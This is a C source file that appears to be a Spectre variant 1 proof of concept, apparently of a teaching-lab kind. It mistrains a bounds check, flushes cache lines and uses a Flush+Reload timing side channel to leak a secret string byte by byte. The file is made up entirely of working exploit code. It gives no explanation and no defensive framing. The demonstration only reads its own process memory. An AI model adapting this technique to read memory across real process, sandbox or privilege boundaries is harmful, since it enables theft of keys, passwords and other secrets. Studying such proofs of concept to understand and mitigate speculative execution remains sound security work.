#include <stdio.h>
#include <stdint.h>
#include <emmintrin.h>
#include <x86intrin.h>
#include <unistd.h>

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

unsigned int bound_lower = 0;
unsigned int bound_upper = 9;

uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
char *secret = "Some Secret Value";

uint8_t array[256*4096];
static int scores[256];

uint8_t restrictedAccess(size_t x)
{
    if (x <= bound_upper && x >= bound_lower) {
        return buffer[x];
    } else {
        return 0;
    }
}

void flushSideChannel()
{
    int i;

    for (i = 0; i < 256; i++) {
        array[i*4096 + DELTA] = 1;
    }

    for (i = 0; i < 256; i++) {
        _mm_clflush(&array[i*4096 + DELTA]);
    }
}

void reloadSideChannelImproved()
{
    int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;

    for (i = 2; i < 256; i++) {
        addr = &array[i*4096 + DELTA];

        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;

        if (time2 <= CACHE_HIT_THRESHOLD) {
            scores[i]++;
        }
    }
}

void spectreAttack(size_t index_beyond)
{
    int i;
    uint8_t s;
    volatile int z;

    for (i = 0; i < 10; i++) {
        restrictedAccess(i);
    }

    _mm_clflush(&bound_upper);
    _mm_clflush(&bound_lower);

    for (i = 0; i < 256; i++) {
        _mm_clflush(&array[i*4096 + DELTA]);
    }

    for (z = 0; z < 100; z++) { }

    s = restrictedAccess(index_beyond);
    array[s*4096 + DELTA] += 88;
}

int main()
{
    size_t index_beyond = (size_t)(secret - (char*)buffer);
    int i, j, max;
    char recovered[100] = {0};

    for (j = 0; j < 40; j++) {

        for (i = 0; i < 256; i++) scores[i] = 0;

        for (i = 0; i < 1000; i++) {
            printf("*****\n");
            flushSideChannel();
            spectreAttack(index_beyond + j);
            usleep(10);
            reloadSideChannelImproved();
        }

        max = 1;
        for (i = 2; i < 256; i++) {
            if (scores[i] > scores[max]) {
                max = i;
            }
        }

        if (max == 0) {
	    recovered[j] = '\0';
	    break;
	}

	recovered[j] = (char)max;
	printf("%c", recovered[j]);
	fflush(stdout);
    }
	printf("\n");
	printf("\n\nRecovered string: %s\n", recovered);

    return 0;
}